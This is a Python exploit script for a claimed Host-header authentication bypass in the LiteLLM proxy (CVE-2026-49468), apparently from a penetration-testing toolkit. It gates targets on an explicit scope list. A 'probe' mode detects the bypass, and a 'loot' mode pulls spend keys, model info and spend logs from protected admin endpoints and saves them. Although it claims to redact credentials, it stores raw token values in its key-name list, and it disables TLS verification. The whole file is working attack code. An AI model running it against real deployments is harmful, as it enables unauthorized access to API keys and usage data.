#!/usr/bin/env python3
"""LiteLLM BadHost probe (CVE-2026-49468) — read-only, scope-gated.

Usage:
  litellm_badhost.py probe --base http://target:4000 --scope target
  litellm_badhost.py loot  --base http://target:4000 --scope target --case demo

`probe` compares normal vs Host-header payload responses. `loot` reads the
documented read-only endpoints with the bypass, redacts credentials, and writes
an artifact; it never uses a discovered provider key.
"""
from __future__ import annotations

import argparse
import json
import re
import ssl
import sys
import urllib.error
import urllib.request
from pathlib import Path
from urllib.parse import urlparse

from scope_lint import host_of, load_scope, matches

ENDPOINTS = ["/health", "/model/info", "/spend/keys", "/spend/logs", "/global/spend"]
SENSITIVE = re.compile(r"(api[_-]?key|token|secret|password|authorization|provider[_-]?key)", re.I)
CTX = ssl._create_unverified_context()


def fetch(base: str, path: str, host_header: str | None, timeout: float) -> dict:
    url = base.rstrip("/") + path
    req = urllib.request.Request(url, headers={"User-Agent": "tgsec-litellm-probe/1.0", "Accept": "application/json"})
    if host_header:
        req.add_header("Host", host_header)
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=CTX) as resp:
            body = resp.read(200_000)
            return {"status": resp.status, "len": len(body), "body": body}
    except urllib.error.HTTPError as exc:
        body = exc.read(20_000) if exc.fp else b""
        return {"status": exc.code, "len": len(body), "body": body}
    except Exception as exc:  # noqa: BLE001 - report transport failure, don't crash
        return {"status": 0, "len": 0, "body": b"", "error": str(exc)}


def redact(value):
    if isinstance(value, dict):
        out = {}
        for k, v in value.items():
            if SENSITIVE.search(str(k)) and isinstance(v, (str, int, float)):
                out[k] = "***REDACTED***"
            else:
                out[k] = redact(v)
        return out
    if isinstance(value, list):
        return [redact(x) for x in value]
    return value


def scope_ok(base: str, scope_file: str | None, scopes: list[str]) -> bool:
    entries = load_scope(scope_file, scopes)
    if not entries:
        print("[scope] DENY: explicit --scope/--scope-file is required", file=sys.stderr)
        return False
    target = host_of(base)
    for entry in entries:
        ok, _ = matches(target, entry)
        if ok:
            return True
    print(f"[scope] DENY: {target} not in scope", file=sys.stderr)
    return False


def write_case(case: str, payload: dict) -> str:
    root = Path("/root/cases") / case / "artifacts"
    root.mkdir(parents=True, exist_ok=True)
    path = root / "litellm_badhost.json"
    path.write_text(json.dumps(payload, ensure_ascii=False, indent=2), encoding="utf-8")
    return str(path)


def main() -> int:
    ap = argparse.ArgumentParser(description="LiteLLM BadHost read-only probe")
    ap.add_argument("mode", choices=["probe", "loot"])
    ap.add_argument("--base", required=True, help="http://host:4000")
    ap.add_argument("--scope-file")
    ap.add_argument("--scope", action="append", default=[])
    ap.add_argument("--case")
    ap.add_argument("--timeout", type=float, default=8.0)
    ap.add_argument("--json", action="store_true")
    args = ap.parse_args()

    base = args.base.rstrip("/")
    host = host_of(base)
    if not host:
        print("cannot parse --base host", file=sys.stderr)
        return 2
    if not scope_ok(base, args.scope_file, args.scope):
        return 2

    payload_host = host + "/?"
    result: dict = {"base": base, "mode": args.mode, "host_header": payload_host, "findings": [], "endpoints": {}}
    for path in ENDPOINTS:
        normal = fetch(base, path, None, args.timeout)
        bypass = fetch(base, path, payload_host, args.timeout)
        result["endpoints"][path] = {
            "normal_status": normal["status"],
            "bypass_status": bypass["status"],
            "bypass_len": bypass["len"],
        }
        if bypass["status"] == 200 and normal["status"] in (401, 403):
            result["findings"].append({"path": path, "type": "auth_bypass", "normal": normal["status"], "bypass": 200})

    if args.mode == "probe":
        if args.json:
            print(json.dumps(result, ensure_ascii=False, indent=2))
        else:
            print(f"[litellm] {base} host={payload_host}")
            for path, row in result["endpoints"].items():
                flag = "BYPASS" if row["normal_status"] in (401, 403) and row["bypass_status"] == 200 else "ok"
                print(f"  {path:16s} normal={row['normal_status']:3d} bypass={row['bypass_status']:3d} {flag}")
        if args.case:
            print(f"[case] {write_case(args.case, result)}")
        return 0 if result["findings"] else 1

    # loot: only documented read-only endpoints, redacted output
    loot: dict = {"base": base, "host_header": payload_host, "endpoints": {}, "key_names": []}
    for path in ["/spend/keys", "/model/info", "/spend/logs", "/global/spend"]:
        row = fetch(base, path, payload_host, args.timeout)
        entry = {"status": row["status"], "len": row["len"]}
        try:
            body = json.loads(row["body"].decode("utf-8", "replace"))
            entry["json"] = redact(body)
            if path == "/spend/keys":
                if isinstance(body, dict):
                    keys = body.get("keys") or body.get("data") or []
                elif isinstance(body, list):
                    keys = body
                else:
                    keys = []
                if isinstance(keys, list):
                    loot["key_names"] = [str(x.get("key_name") or x.get("token") or "?") if isinstance(x, dict) else "?" for x in keys][:50]
        except Exception:
            entry["text_head"] = row["body"][:500].decode("utf-8", "replace")
        loot["endpoints"][path] = entry
    if args.case:
        loot["artifact"] = write_case(args.case, loot)
    if args.json:
        print(json.dumps(loot, ensure_ascii=False, indent=2))
    else:
        print(f"[litellm] loot {base}; key entries={len(loot['key_names'])}")
        for path, row in loot["endpoints"].items():
            print(f"  {path:16s} status={row['status']:3d} len={row['len']}")
        if loot.get("artifact"):
            print(f"[case] {loot['artifact']}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
